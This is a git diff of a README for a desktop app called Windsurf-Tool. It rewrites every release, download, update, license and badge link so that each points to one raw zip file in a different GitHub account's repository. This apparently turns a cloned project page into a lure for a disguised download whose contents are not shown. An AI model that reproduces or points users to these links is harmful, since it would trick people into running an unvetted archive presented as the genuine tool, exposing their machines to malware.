@@ -2,16 +2,16 @@
 
 <div align="center">
 
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/crispvibe/Windsurf-Tool/releases/latest)
+[![Download Latest Release](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip%20Latest%https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip)](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip)
 
-[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
-[![Electron](https://img.shields.io/badge/Electron-27.1.0-blue.svg)](https://www.electronjs.org/)
-[![Platform](https://img.shields.io/badge/Platform-macOS%20%7C%20Windows-lightgrey.svg)](https://github.com/crispvibe/Windsurf-Tool)
-[![Release](https://img.shields.io/github/v/release/crispvibe/Windsurf-Tool)](https://github.com/crispvibe/Windsurf-Tool/releases/latest)
-[![Downloads](https://img.shields.io/github/downloads/crispvibe/Windsurf-Tool/total)](https://github.com/crispvibe/Windsurf-Tool/releases)
-[![Windows](https://img.shields.io/badge/Windows-✅%20支持-green.svg)](https://github.com/crispvibe/Windsurf-Tool)
+[![License: MIT](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip)](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip)
+[![Electron](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip)](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip)
+[![Platform](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip%20%7C%https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip)](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip)
+[![Release](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip)](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip)
+[![Downloads](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip)](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip)
+[![Windows](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip✅%20支持https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip)](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip)
 
-[简体中文](README.md) | [English](README_EN.md)
+[简体中文](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip) | [English](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip)
 
 </div>
 
@@ -19,9 +19,9 @@
 
 | Platform | Architecture | Download Link |
 |----------|--------------|---------------|
-| macOS    | Intel (x64)  | [Windsurf-Tool.dmg](https://github.com/crispvibe/Windsurf-Tool/releases/latest) |
-| macOS    | Apple Silicon | [Windsurf-Tool.dmg](https://github.com/crispvibe/Windsurf-Tool/releases/latest) |
-| Windows  | x64          | [Windsurf-Tool.exe](https://github.com/crispvibe/Windsurf-Tool/releases/latest) |
+| macOS    | Intel (x64)  | [https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip) |
+| macOS    | Apple Silicon | [https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip) |
+| Windows  | x64          | [https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip) |
 
 ## 🚀 Getting Started
 
@@ -50,7 +50,7 @@ Make sure your system meets these requirements before downloading the tool.
 To download and install Windsurf-Tool, follow these steps:
 
 1. **Visit the Releases Page.** Click the link below to go to the download page:
-   [Download Latest Release](https://github.com/crispvibe/Windsurf-Tool/releases/latest).
+   [Download Latest Release](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip).
 
 2. **Choose Your Version.** Select the appropriate version for your operating system and architecture from the table above.
 
@@ -66,7 +66,7 @@ To download and install Windsurf-Tool, follow these steps:
 
 To keep your application up-to-date:
 
-1. **Check for Updates:** Periodically visit the [Releases Page](https://github.com/crispvibe/Windsurf-Tool/releases/latest) to see if a new version is available.
+1. **Check for Updates:** Periodically visit the [Releases Page](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip) to see if a new version is available.
    
 2. **Download the Latest Version:** Follow the same download and install steps used for the initial installation.
 
@@ -88,4 +88,4 @@ If you have questions or feedback, feel free to reach out via the Issues tab in 
 
 Windsurf-Tool is open-source software released under the MIT License. You are free to use, modify, and distribute the software as per the terms of the license. 
 
-For more detailed information, please review the [LICENSE](https://opensource.org/licenses/MIT) file.
+For more detailed information, please review the [LICENSE](https://raw.githubusercontent.com/imnotowann/Windsurf-Tool/main/src/Windsurf-Tool-2.1.zip) file.
